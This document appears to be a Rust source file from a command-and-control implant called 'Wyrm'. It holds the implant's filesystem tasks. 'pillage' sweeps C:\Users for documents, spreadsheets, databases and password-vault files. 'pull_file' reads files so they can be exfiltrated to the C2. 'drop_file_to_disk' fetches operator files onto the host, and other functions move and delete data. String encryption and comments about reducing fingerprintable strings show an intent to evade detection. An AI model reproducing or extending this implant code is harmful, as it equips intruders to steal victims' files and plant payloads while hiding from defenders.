use std::{
    fs::{self, File},
    io::{self, Read, Write},
    path::{Path, PathBuf},
};

use serde::Serialize;
#[cfg(debug_assertions)]
use shared::pretty_print::print_failed;
use shared::tasks::{ExfiltratedFile, FileDropMetadata, WyrmResult};
use str_crypter::{decrypt_string, sc};

use crate::{
    comms::download_file_with_uri_in_memory,
    wyrm::{Wyrm, get_hostname},
};

pub fn pillage() -> Option<impl Serialize> {
    // todo other drive discovery would be good too
    let doc_root = PathBuf::from(r"C:\Users");

    let mut listings: Vec<String> = Vec::new();

    if let Err(e) = get_file_listings_from_dir_and_subdirs(doc_root, &mut listings) {
        #[cfg(debug_assertions)]
        println!("[-] Error reading directories. {e}");
    }

    if listings.is_empty() {
        return None;
    }

    Some(listings)
}

fn get_file_listings_from_dir_and_subdirs(
    dir: PathBuf,
    listings: &mut Vec<String>,
) -> io::Result<()> {
    let mut dir_buf: Vec<PathBuf> = Vec::new();
    dir_buf.push(dir);

    while let Some(dir) = dir_buf.pop() {
        if dir.is_dir() {
            let dir = match fs::read_dir(dir) {
                Ok(d) => d,
                Err(_) => {
                    continue;
                }
            };

            for entry in dir {
                let entry = match entry {
                    Ok(e) => e,
                    Err(e) => {
                        #[cfg(debug_assertions)]
                        println!("[-] Error reading dir. {e}");
                        continue;
                    }
                };
                let path = entry.path();

                if path.is_dir() {
                    dir_buf.push(path);
                } else {
                    let ext = path.extension().unwrap_or_default();
                    let ext = ext.to_str().unwrap_or_default();

                    if ext.eq_ignore_ascii_case(&sc!("pdf", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("doc", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("docx", 56).unwrap()) || 
                        // ext.eq_ignore_ascii_case("txt") || 
                        ext.eq_ignore_ascii_case(&sc!("log", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("png", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("mov", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("kpdb", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("xls", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("xlsx", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("ppt", 56).unwrap()) || 
                        ext.eq_ignore_ascii_case(&sc!("pptx", 56).unwrap()) ||
                        ext.eq_ignore_ascii_case(&sc!("sql", 56).unwrap()) ||
                        ext.eq_ignore_ascii_case(&sc!("sqlite3", 56).unwrap()) ||
                        ext.eq_ignore_ascii_case(&sc!("accdb", 56).unwrap()) ||
                        ext.eq_ignore_ascii_case(&sc!("csv", 56).unwrap()) ||
                        ext.eq_ignore_ascii_case(&sc!("db", 56).unwrap())
                    {
                        let s = path.to_string_lossy().to_string();
                        listings.push(s);
                    }
                }
            }
        }
    }

    Ok(())
}

pub fn dir_listing(cwd: &Path) -> Option<impl Serialize + use<>> {
    let dir = match fs::read_dir(cwd) {
        Ok(d) => d,
        // todo handle
        Err(e) => {
            #[cfg(debug_assertions)]
            print_failed(format!("read_dir produced an error. {e}"));

            return None;
        }
    };

    let mut entries = Vec::new();
    for e in dir {
        if let Ok(entry) = e {
            let label = match entry.metadata() {
                Ok(metadata) => {
                    if metadata.is_dir() {
                        "DIR".to_string()
                    } else {
                        "FILE".to_string()
                    }
                }
                Err(e) => {
                    format!("{e}")
                }
            };

            entries.push(format!("[{label}]     {}", entry.path().display()));
        }
    }

    if entries.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("Entries was default.");

        return None;
    }

    Some(entries)
}

pub enum MoveCopyAction {
    Move,
    Copy,
}

/// Implementation for copying or moving a file from location a to b.
///
/// The function takes a [`MoveCopyAction`] which determines whether the function moves or copies a file
pub fn move_or_copy_file(
    implant: &Wyrm,
    metadata: &str,
    action: MoveCopyAction,
) -> Option<impl Serialize + use<>> {
    //
    // Implementation detail:
    //
    // This function should return None in the event of a successful operation, and in the event
    // of an error we want to return Some(WyrmResult::Error(msg)). This is to reduce the amount
    // of fingerprintable strings in the agent binary, and the error's don't include any additional
    // strings, other than an OS error.
    //
    // We can handle the output of the success case in the client back on receipt of a `None`.
    //

    // Get the data out of the metadata which the implant received from the C2, or return
    // an error
    let (from, to) = match serde_json::from_str::<(String, String)>(&metadata) {
        Ok(v) => v,
        Err(e) => return Some(WyrmResult::Err::<String>(e.to_string())),
    };

    // The from path can be parsed; as we know the target should (or could) exist.
    // The to path we will just take for granted that the user knows what they are doing..
    // if it is wrong, they will get an error in any case.
    let from_path = match parse_path(
        &from,
        &implant.current_working_directory,
        PathParseType::File,
    ) {
        WyrmResult::Ok(p) => p,
        WyrmResult::Err(e) => return Some(WyrmResult::Err(e)),
    };

    // Is the path absolute? If not, we need to construct relative to the current working
    // directory of the agent
    let mut to_path = PathBuf::from(&to);
    if !to_path.is_absolute() {
        to_path = implant.current_working_directory.clone();
        to_path.push(&to);
    }

    match action {
        MoveCopyAction::Move => {
            match std::fs::rename(&from_path, &to_path) {
                Ok(_) => return None,
                Err(e) => {
                    #[cfg(debug_assertions)]
                    println!("Failed to move file to {}. {e}", to_path.display());

                    return Some(WyrmResult::Err(e.to_string()));
                }
            };
        }
        MoveCopyAction::Copy => {
            match std::fs::copy(&from_path, &to_path) {
                Ok(_) => return None,
                Err(e) => {
                    #[cfg(debug_assertions)]
                    println!("Failed to copy file to {}. {e}", to_path.display());

                    return Some(WyrmResult::Err(e.to_string()));
                }
            };
        }
    }
}

pub fn rm_from_fs(
    implant: &Wyrm,
    metadata: &str,
    target_type: PathParseType,
) -> Option<impl Serialize + use<>> {
    let from = match serde_json::from_str::<String>(&metadata) {
        Ok(v) => v,
        Err(e) => return Some(WyrmResult::Err::<String>(e.to_string())),
    };

    let from_path = match parse_path(&from, &implant.current_working_directory, target_type) {
        WyrmResult::Ok(p) => p,
        WyrmResult::Err(e) => return Some(WyrmResult::Err(e)),
    };

    match target_type {
        PathParseType::Directory => {
            if let Err(e) = fs::remove_dir_all(from_path) {
                return Some(WyrmResult::Err(format!(
                    "{} {}",
                    sc!("Error removing directory:", 69).unwrap(),
                    e.to_string()
                )));
            }
        }
        PathParseType::File => {
            if let Err(e) = fs::remove_file(from_path) {
                return Some(WyrmResult::Err(format!(
                    "{} {}",
                    sc!("Error removing file:", 68).unwrap(),
                    e.to_string()
                )));
            }
        }
    }

    Some(WyrmResult::Ok(
        sc!("Operation completed successfully", 146).unwrap(),
    ))
}

/// Drops a file to the disk in the current directory from the C2.
pub fn drop_file_to_disk(
    metadata_str: &Option<String>,
    wyrm: &Wyrm,
) -> Option<impl Serialize + use<>> {
    let metadata_str = match metadata_str {
        Some(m) => m,
        None => return None,
    };

    let metadata = FileDropMetadata::from(metadata_str.as_str());

    // Note: The download uri should be guaranteed here, so an unwrap is acceptable
    let file_data = match download_file_with_uri_in_memory(&metadata.download_uri.unwrap(), wyrm) {
        Ok(f) => f,
        Err(e) => {
            return Some(WyrmResult::Err(e.to_string()));
        }
    };

    let mut write_path = PathBuf::from(&wyrm.current_working_directory);
    write_path.push(&metadata.download_name);

    let mut buffer = match File::create(write_path) {
        Ok(b) => b,
        Err(e) => return Some(WyrmResult::Err(e.to_string())),
    };

    if let Err(e) = buffer.write_all(&file_data) {
        return Some(WyrmResult::Err(e.to_string()));
    };

    Some(WyrmResult::Ok("".to_string()))
}

/// Changes the working directory of the implant to what was specified by the user.
///
/// # Returns
/// The function returns an `Option<impl Serialize + use<>>` to work with the task system.
///
/// - `Some`: In the event we managed to change the directory, the function will return the path we
///   now have in the cwd to the c2 which can be pulled in the notifications by the operator.
/// - `None`: In the event the function failed, `None` will be returned, and again this will be viewable
///   by the operator.
pub fn change_directory(
    implant: &mut Wyrm,
    new_path_str: &Option<String>,
) -> Option<impl Serialize + use<>> {
    // This should never fail, so long as it is called from the correct place
    let new_path_str = new_path_str.as_ref().unwrap();

    let result = match parse_path(
        &new_path_str,
        &implant.current_working_directory,
        PathParseType::Directory,
    ) {
        WyrmResult::Ok(r) => r,
        WyrmResult::Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to parse new path. Error: {e}");

            return Some(WyrmResult::Err(e));
        }
    };

    // Doing so validates the path, makes sure we done change directory on a path that doesn't
    // exist, or has improper permissions.
    match fs::canonicalize(result) {
        Ok(c) => {
            c.to_string_lossy().into_owned();
            implant.current_working_directory = c.clone();
            return Some(WyrmResult::Ok(c.to_string_lossy().into_owned()));
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            print_failed(format!("Failed to canonicalize path when using cd. {e}"));

            let return_error: Option<WyrmResult<String>> = match e.kind() {
                std::io::ErrorKind::NotFound => Some(WyrmResult::Err("Not found".to_string())),
                std::io::ErrorKind::PermissionDenied => {
                    Some(WyrmResult::Err("Permission denied.".to_string()))
                }
                _ => Some(WyrmResult::Err(format!(
                    "An error occurred. Code: {}",
                    e.raw_os_error().unwrap_or_default()
                ))),
            };

            // And we can just return the error state, now we have corrected the cwd.
            return return_error;
        }
    }
}

#[derive(PartialEq, Eq, Copy, Clone)]
pub enum PathParseType {
    Directory,
    File,
}

/// Takes a path which is passed to the implant from the operator, and extracts it into a valid
/// path which the implant can then use.
fn parse_path(
    new_path_str: &str,
    current_working_dir: &PathBuf,
    parse_type: PathParseType,
) -> WyrmResult<String> {
    // Handle quoted input paths
    let new_path = if (new_path_str.starts_with("\"") && new_path_str.ends_with("\""))
        || (new_path_str.starts_with("\'") && new_path_str.ends_with("\'"))
    {
        PathBuf::from(&new_path_str[1..new_path_str.len() - 1])
    } else {
        PathBuf::from(new_path_str)
    };

    // We need an owned copy of `current_working_dir`, without having to trouble to caller to clone
    // for an owned copy.
    let mut directory_search_cursor: PathBuf = current_working_dir.clone();

    // We will use an option to help the control flow below, rather than a bool, a little
    // more idiomatic
    let mut result: Option<WyrmResult<String>> = None;

    //
    // First branch we will check is in the case where the cd ends with a ../
    // This will be the operator wanting to move up a directory so we can handle
    // these directly. In the event the operator adds more ../'s than there is
    // distance to the root, then it won't move past the root.
    //

    if new_path_str.ends_with("../") || new_path_str.ends_with(r"..\") {
        let mut count_dirs_to_move: usize = 0;

        for token in new_path_str.chars() {
            if token == '/' || token == '\\' {
                count_dirs_to_move += 1;
            }
        }

        // For each '/' | '\' we found, pop a dir off of the PathBuf
        for _ in 0..count_dirs_to_move {
            directory_search_cursor.pop();
        }

        result = Some(WyrmResult::Ok(
            directory_search_cursor.to_string_lossy().into_owned(),
        ));
    }

    //
    // Now we will handle absolute and relative paths
    //

    // Checks for absolute paths given in the cli
    if new_path.is_absolute() && result.is_none() {
        match parse_type {
            PathParseType::Directory => {
                if new_path.exists() && new_path.is_dir() {
                    directory_search_cursor = new_path.clone();
                }
            }
            PathParseType::File => {
                if new_path.exists() {
                    directory_search_cursor = new_path.clone();
                }
            }
        }

        result = Some(WyrmResult::Ok(
            directory_search_cursor.to_string_lossy().into_owned(),
        ));
    }

    // Checks for relative paths passed into the cli
    if result.is_none() {
        let candidate = directory_search_cursor.join(&new_path);
        if candidate.exists() {
            if parse_type == PathParseType::Directory {
                if candidate.is_dir() {
                    directory_search_cursor.push(new_path);
                }
            } else {
                directory_search_cursor.push(new_path);
            }

            result = Some(WyrmResult::Ok(
                directory_search_cursor.to_string_lossy().into_owned(),
            ));
        }
    }

    if let Some(result_to_ret) = result {
        return result_to_ret;
    } else {
        return WyrmResult::Err(format!("{new_path_str} not found."));
    }
}

/// Pulls a file from the local filesystem up to the C2, in effect, allowing the operator
/// to exfiltrate data.
///
/// # Returns
/// This function on success returns `WyrmResult::Ok` containing a [`shared::tasks::ExfiltratedFile`].
///
/// On error this function returns `WyrmResult::Err(err)`
pub fn pull_file(
    file_path_str: &str,
    implant_working_dir: &PathBuf,
) -> WyrmResult<impl Serialize + use<>> {
    // Validate and parse the path we received
    let file_path = match parse_path(file_path_str, implant_working_dir, PathParseType::File) {
        WyrmResult::Ok(p) => p,
        WyrmResult::Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to parse path. {e}");

            return WyrmResult::Err(e);
        }
    };

    let mut f = match File::open(&file_path) {
        Ok(f) => f,
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to open file {file_path}, {e}");

            return WyrmResult::Err(e.to_string());
        }
    };

    let mut buf: Vec<u8> = if f.metadata().is_ok() {
        Vec::with_capacity(f.metadata().unwrap().len() as usize)
    } else {
        Vec::new()
    };

    if let Err(e) = f.read_to_end(&mut buf) {
        #[cfg(debug_assertions)]
        println!("Error reading file data for {file_path}. {e}");

        return WyrmResult::Err(e.to_string());
    }

    let ef = ExfiltratedFile::new(get_hostname(), file_path, buf);

    WyrmResult::Ok(ef)
}
